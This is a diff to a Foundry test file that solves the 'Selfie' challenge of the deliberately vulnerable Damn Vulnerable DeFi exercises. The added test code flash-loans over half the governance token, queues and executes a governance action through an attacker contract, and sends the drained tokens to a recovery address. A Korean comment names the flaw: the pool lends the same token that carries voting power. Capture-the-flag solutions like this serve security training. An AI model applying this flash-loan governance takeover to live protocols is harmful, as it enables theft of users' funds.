@@ -7,6 +7,9 @@ import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 
+import {SelfieAttacker} from "../../src/selfie/SelfieAttacker.sol";
+import {ISimpleGovernance} from "../../src/selfie/ISimpleGovernance.sol";
+
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -62,7 +65,15 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+
+        // 돌파구: 풀이 빌려주는 토큰과 거버넌스 지분 토큰이 같아서 풀에서 빌려서 거버넌스를 움직이면 풀림
+        SelfieAttacker attacker = new SelfieAttacker(pool, governance);
+        pool.flashLoan(attacker, address(token), TOKEN_INITIAL_SUPPLY / 2 + 1, hex"");
+        ISimpleGovernance.GovernanceAction memory action = governance.getAction(governance.getActionCounter() - 1);
+        vm.warp(block.timestamp + 2 days);
+        governance.executeAction(governance.getActionCounter() - 1);
+
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
